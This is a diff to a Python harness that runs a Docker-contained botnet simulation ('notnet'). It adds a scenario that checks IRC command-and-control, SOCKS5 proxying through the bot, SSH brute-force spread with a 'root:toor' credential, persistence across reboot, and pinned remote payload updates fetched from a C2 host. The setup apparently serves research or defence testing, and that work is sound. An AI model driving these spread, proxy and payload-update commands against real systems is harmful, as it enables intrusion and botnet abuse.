@@ -3,19 +3,21 @@
 evidence, and writes the parity report.
 
 Usage:
-  python3 run_sim.py [--scenario all|c2-drive|autonomous|resilience|monetization|defence] [--posture lax|standard|hardened]
+  python3 run_sim.py [--scenario all|c2-drive|autonomous|resilience|monetization|defence|remaining-parity] [--posture lax|standard|hardened]
 
 Scenarios:
-  c2-drive     S1: operator drives spread/scan against the fleet via the C2 queue
-  autonomous   S2: IRC+HTTP disabled, bot left to spread on its own (Finding A)
-  resilience   S5: flux + dead-drop + rotation
-  monetization S6: SOCKS5 proxy + relay client tests
-  defence      S8: same as c2-drive under lax/standard/hardened posture
-  all          run c2-drive then autonomous (default)
+  c2-drive         S1: operator drives spread/scan against the fleet via the C2 queue
+  autonomous       S2: IRC+HTTP disabled, bot left to spread on its own (Finding A)
+  resilience       S5: flux + dead-drop + rotation
+  monetization     S6: SOCKS5 proxy + relay client tests
+  defence          S8: same as c2-drive under lax/standard/hardened posture
+  remaining-parity S7: IRC C2, SOCKS5 traffic, persistence, payload pinning
+  all              run c2-drive then autonomous then remaining-parity (default)
 
 Output: reports/parity-<timestamp>.md + reports/evidence/ copy of logs.
 """
 import argparse
+import hashlib
 import json
 import os
 import shutil
@@ -171,6 +173,16 @@ def bot_log_since(ts_epoch):
     """Return bot docker log lines since a unix timestamp."""
     try:
         r = subprocess.run(["docker", "logs", "sim-bot", "--since", str(int(ts_epoch))],
+                           capture_output=True, text=True, timeout=30)
+        return (r.stdout or "") + (r.stderr or "")
+    except Exception:
+        return ""
+
+
+def bot_log_full():
+    """Return the complete bot docker log."""
+    try:
+        r = subprocess.run(["docker", "logs", "sim-bot"],
                            capture_output=True, text=True, timeout=30)
         return (r.stdout or "") + (r.stderr or "")
     except Exception:
@@ -394,6 +406,202 @@ def scenario_monetization(report):
                "; ".join(h[1][:80] for h in relay_hits[:2] + [("sim-bot-log", l.strip()) for l in relay_bot[:2]]) or "no relay evidence")
 
 
+def scenario_remaining_parity(report):
+    """S7: the four readme claims the sim had never exercised end-to-end —
+    IRC C2 channel, real SOCKS5 proxied traffic, persistence across reboot,
+    payload pinning/checksum."""
+    log("=== S7 remaining-parity: IRC C2, SOCKS5 traffic, persistence, payload pinning ===")
+
+    # ── 1. IRC C2 end-to-end ─────────────────────────────────────────
+    recreate_bot("notnet.conf.irc")
+    time.sleep(5)
+    # The c2-irc mock serves queued commands as PRIVMSG from the authorized
+    # nick (mockirc); the bot's irc_read authenticates on 001/250/376/366.
+    queue_cmd("exec", "uname -a")
+    # Poll — the mock serves on its own recv cadence; a fixed sleep missed
+    # the serve when the bot needed a reconnect cycle.
+    irc_cmd = []
+    irc_serve = []
+    hb_irc = []
+    deadline = time.time() + 45
+    while time.time() < deadline:
+        time.sleep(3)
+        ev = read_evidence()
+        botlog = bot_log_full()
+        irc_cmd = [l for l in botlog.splitlines() if "IRC: command:" in l]
+        irc_serve = grep_evidence(ev, ["IRC SERVE"], files=["irc.log"])
+        hb_irc = grep_evidence(ev, ['"cmd":"status"'], files=["irc.log"])
+        if irc_cmd and irc_serve and hb_irc:
+            break
+    ev = read_evidence()
+    botlog = bot_log_full()
+    irc_conn = [l for l in botlog.splitlines() if "IRC: connected" in l]
+    irc_serve = grep_evidence(ev, ["IRC SERVE"], files=["irc.log"])
+    report.add("IRC C2: bot connects and authenticates (legacy channel)",
+               "PASS" if irc_conn else "FAIL",
+               "; ".join(l.strip()[:80] for l in irc_conn[-2:]) or "no IRC: connected in bot log")
+    report.add("IRC C2: queued command served + executed over IRC",
+               "PASS" if irc_cmd and irc_serve else "FAIL",
+               "; ".join(l.strip()[:80] for l in irc_cmd[-2:] + [h[1][:80] for h in irc_serve[-2:]]))
+    # heartbeat over IRC: bot sends PRIVMSG with heartbeat JSON; mock logs IRC RECV
+    hb_irc = grep_evidence(ev, ['"cmd":"status"'], files=["irc.log"])
+    report.add("IRC C2: heartbeats flow over IRC",
+               "PASS" if hb_irc else "FAIL",
+               "; ".join(h[1][:80] for h in hb_irc[-2:]) or "no heartbeat JSON in irc.log")
+
+    # ── 2. SOCKS5 real traffic ───────────────────────────────────────
+    # proxy on -> a client INSIDE the sim connects to the bot proxy, does the
+    # RFC 1928 handshake + RFC 1929 token auth, and reaches the target. The
+    # target (c2 payload server) must see the connection from the BOT's IP.
+    recreate_bot("notnet.conf.c2drive")
+    time.sleep(5)
+    queue_cmd("proxy", "on 1080")
+    # Poll for the proxy bind (the command rides a heartbeat; give the loop
+    # time) before running the client.
+    proxy_bind = []
+    deadline = time.time() + 40
+    while time.time() < deadline:
+        time.sleep(3)
+        botlog = bot_log_full()
+        proxy_bind = [l for l in botlog.splitlines() if "SOCKS5: proxy listening" in l]
+        if proxy_bind:
+            break
+    # run the RFC 1928 client from inside the c2 container (has python +
+    # simnet reachability to the bot at 172.29.0.9)
+    socks_out = ""
+    socks_rc = -1
+    try:
+        r = subprocess.run(
+            ["docker", "exec", "sim-c2", "python3", "/app/socks5_client.py",
+             "172.29.0.9", "1080", "172.29.0.2", "8443", "proxytok", "/bot/notnet"],
+            capture_output=True, text=True, timeout=90)
+        socks_out = (r.stdout or "") + (r.stderr or "")
+        socks_rc = r.returncode
+    except Exception as e:
+        socks_out = f"exec error: {e}"
+    ev = read_evidence()
+    # the c2 payload server must log the PAYLOAD download sourced from the BOT IP
+    pay_src = grep_evidence(ev, ["PAYLOAD notnet download from 172.29.0.9",
+                                  "PAYLOAD download from 172.29.0.9"],
+                            files=["http.log"])
+    report.add("SOCKS5: client handshake + CONNECT through bot proxy (RFC 1928/1929)",
+               "PASS" if socks_rc == 0 and "SOCKS5 CONNECT OK" in socks_out else "FAIL",
+               socks_out.strip().replace("\n", " | ")[:160])
+    report.add("SOCKS5: target sees proxied request from BOT source IP",
+               "PASS" if pay_src else "FAIL",
+               "; ".join(h[1][:80] for h in pay_src[-2:]) or "no PAYLOAD download from 172.29.0.9 in http.log")
+
+    # ── 3. Persistence across reboot ─────────────────────────────────
+    # legacy-server-01 has persist=true: its drop command is recorded to
+    # /app/persist.sh and device_entrypoint.sh relaunches it at boot.
+    # Infect it, restart the container, and require a NEW heartbeat with the
+    # same bot_tag after the restart.
+    recreate_bot("notnet.conf.c2drive")
+    time.sleep(5)
+    queue_cmd("spread", "172.29.20.31:22")   # legacy-server-01, root:toor in pool
+    # Poll for the baseline infection heartbeat (spread rides a heartbeat;
+    # SSH brute-force + drop + payload boot take ~30-60s).
+    pre_hearts = []
+    deadline = time.time() + 90
+    while time.time() < deadline:
+        time.sleep(5)
+        ev = read_evidence()
+        pre_hearts = grep_evidence(ev, ['"tag":"legacy-server-01"'], files=["http.log"])
+        if pre_hearts:
+            break
+    report.add("Persistence: device infected before reboot (baseline heartbeat)",
+               "PASS" if pre_hearts else "FAIL",
+               "; ".join(h[1][:80] for h in pre_hearts[-2:]) or "no legacy-server-01 heartbeat yet")
+    if pre_hearts:
+        # restart the device container — models a reboot. The device's
+        # entrypoint re-runs /app/persist.sh (recorded by the drop) which
+        # relaunches the payload; a NEW heartbeat with the same bot_tag
+        # proves persistence across reboot.
+        subprocess.run(["docker", "restart", "legacy-server-01"],
+                       capture_output=True, text=True, timeout=120)
+        n_before = len(pre_hearts)
+        n_after = n_before
+        last_lines = []
+        # Poll up to 90s — the device template's scan_interval=30 caps the
+        # payload's heartbeat cadence, so a new line can take ~40s to land.
+        deadline = time.time() + 90
+        while time.time() < deadline:
+            time.sleep(5)
+            ev = read_evidence()
+            post_hearts = grep_evidence(ev, ['"tag":"legacy-server-01"'], files=["http.log"])
+            n_after = len(post_hearts)
+            last_lines = [h[1][:70] for h in post_hearts[-2:]]
+            if n_after > n_before:
+                break
+        report.add("Persistence: payload relaunches after device reboot (new heartbeat)",
+                   "PASS" if n_after > n_before else "FAIL",
+                   f"before={n_before} after={n_after}; " + "; ".join(last_lines))
+
+    # ── 4. Payload pinning / checksum ────────────────────────────────
+    # Serve a tampered payload and confirm the bot refuses it; serve a valid
+    # one and confirm it is accepted. Uses the /bot/<name> route added to
+    # c2_http.py. NOTE: the bot's payload_update gates on NOTN magic + size
+    # (<= PAYLOAD_MAX_SIZE 64KB) BEFORE the SHA-256 pin, so the pin test uses
+    # a small NOTN-prefixed synthetic payload (the real ELF would fail the
+    # magic/size gate and never reach the hash comparison).
+    pin_dir = os.path.join(BASE, "payload")
+    os.makedirs(pin_dir, exist_ok=True)
+    try:
+        with open(os.path.join(pin_dir, "notnet"), "rb") as f:
+            real_bytes = f.read()
+        valid = b"NOTN" + real_bytes[:4092]      # under 64KB, magic OK
+        tampered = bytearray(valid)
+        tampered[32] ^= 0xFF                      # same magic, different hash
+        with open(os.path.join(pin_dir, "notnet.pin"), "wb") as f:
+            f.write(valid)
+        with open(os.path.join(pin_dir, "notnet.bad"), "wb") as f:
+            f.write(bytes(tampered))
+        good_sha = hashlib.sha256(valid).hexdigest()
+        bad_sha = hashlib.sha256(bytes(tampered)).hexdigest()
+
+        # good pin: update from /bot/notnet.pin must verify + install
+        conf_pin = os.path.join(BASE, "conf", "generated", "notnet.conf.pin")
+        os.makedirs(os.path.dirname(conf_pin), exist_ok=True)
+        with open(conf_pin, "w") as f:
+            f.write(
+                "# generated S7 pin config — valid payload pin\n"
+                "http_server=c2\nhttp_port=8080\nhttp_path=/api/v1/bot\n"
+                "ws_server=c2-ws\nws_port=8081\nws_enabled=1\n"
+                f"c2_secret={C2_SECRET}\nheartbeat_interval=2\nscan_interval=1\n"
+                f"payload_sha256={good_sha}\nbot_tag=sim-pin-good\n")
+        recreate_bot("generated/notnet.conf.pin")
+        time.sleep(5)
+        queue_cmd("update", "http://c2:8443/bot/notnet.pin")
+        time.sleep(12)
+        botlog = bot_log_full()
+        good_hits = [l for l in botlog.splitlines() if "SHA-256" in l and "verified" in l]
+        report.add("Payload pinning: valid SHA-256 pin accepts update",
+                   "PASS" if good_hits else "FAIL",
+                   "; ".join(l.strip()[:90] for l in good_hits[-2:]) or "no SHA-256 verified in bot log")
+
+        # bad pin: same command, tampered file -> hash mismatch -> refused
+        conf_bad = os.path.join(BASE, "conf", "generated", "notnet.conf.pinbad")
+        with open(conf_bad, "w") as f:
+            f.write(
+                "# generated S7 pin config — tampered payload pin (must refuse)\n"
+                "http_server=c2\nhttp_port=8080\nhttp_path=/api/v1/bot\n"
+                "ws_server=c2-ws\nws_port=8081\nws_enabled=1\n"
+                f"c2_secret={C2_SECRET}\nheartbeat_interval=2\nscan_interval=1\n"
+                f"payload_sha256={good_sha}\nbot_tag=sim-pin-bad\n")
+        recreate_bot("generated/notnet.conf.pinbad")
+        time.sleep(5)
+        queue_cmd("update", "http://c2:8443/bot/notnet.bad")
+        time.sleep(12)
+        botlog = bot_log_full()
+        bad_hits = [l for l in botlog.splitlines() if "SHA-256 mismatch" in l]
+        report.add("Payload pinning: tampered payload refused (hash mismatch, no install)",
+                   "PASS" if bad_hits else "FAIL",
+                   "; ".join(l.strip()[:90] for l in bad_hits[-2:]) or "no SHA-256 mismatch in bot log")
+    except OSError as e:
+        log(f"S7 pinning: payload file error: {e}")
+        report.add("Payload pinning: setup (payload file available)", "FAIL", str(e))
+
+
 def fw_rules_active():
     """Host firewall presence: count our DOCKER-USER rules via sudo."""
     import subprocess
@@ -469,7 +677,7 @@ def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--scenario", default="all",
                     choices=["all", "c2-drive", "autonomous", "resilience", "flux",
-                             "monetization", "defence"])
+                             "monetization", "defence", "remaining-parity"])
     ap.add_argument("--posture", default=os.environ.get("SIM_POSTURE", "lax"),
                     choices=["lax", "standard", "hardened"])
     args = ap.parse_args()
@@ -492,6 +700,8 @@ def main():
         scenario_monetization(report)
     if args.scenario in ("defence",):
         scenario_defence(report)
+    if args.scenario in ("all", "remaining-parity"):
+        scenario_remaining_parity(report)
 
     evdir = copy_evidence()
     out = os.path.join(REPORTS, f"parity-{int(time.time())}.md")
